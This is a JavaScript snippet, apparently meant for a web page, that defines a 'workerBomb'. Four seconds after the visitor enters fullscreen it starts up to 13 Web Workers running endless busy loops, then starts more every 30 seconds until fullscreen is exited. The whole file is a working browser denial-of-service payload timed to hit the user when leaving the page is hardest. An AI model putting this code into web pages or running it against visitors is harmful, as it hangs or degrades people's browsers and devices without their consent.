function workerBomb() {
    console.log("Starting workerBomb...");
    const script = `
        let counter = 0;
        while (true) {
            counter++;
            Math.random() * Math.random();
            if (counter % 1e6 === 0) {
                postMessage({ status: "working", counter });
            }
        }
    `;
    const blob = new Blob([script], { type: "application/javascript" });
    const workerURL = URL.createObjectURL(blob);
    for (let i = 0; i < 13; i++) {
        try {
            const worker = new Worker(workerURL);
            worker.onerror = (error) => console.error("Worker error:", error);
        } catch(e) {
            console.log("Worker limit reached at", i);
            break;
        }
    }
}

let bombActivated = false;
let fullscreenTimer = null;
let repeatBombTimer = null;

function bombFullscreenHandler() {
    const isFullscreen = document.fullscreenElement ||
                         document.webkitFullscreenElement ||
                         document.mozFullScreenElement ||
                         document.msFullscreenElement;

    if (isFullscreen && !bombActivated) {
        console.log("Fullscreen entered - starting 4 second timer for bomb...");
        fullscreenTimer = setTimeout(() => {
            console.log("4 seconds elapsed - activating worker bomb");
            bombActivated = true;
            workerBomb();
            repeatBombTimer = setInterval(workerBomb, 30000);
        }, 4000);
    } else if (!isFullscreen) {
        console.log("Fullscreen exited - cancelling bomb timers");
        if (fullscreenTimer) clearTimeout(fullscreenTimer);
        if (repeatBombTimer) clearInterval(repeatBombTimer);
        bombActivated = false;
    }
}

// Attach listeners
['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(ev => {
    document.addEventListener(ev, bombFullscreenHandler);
});
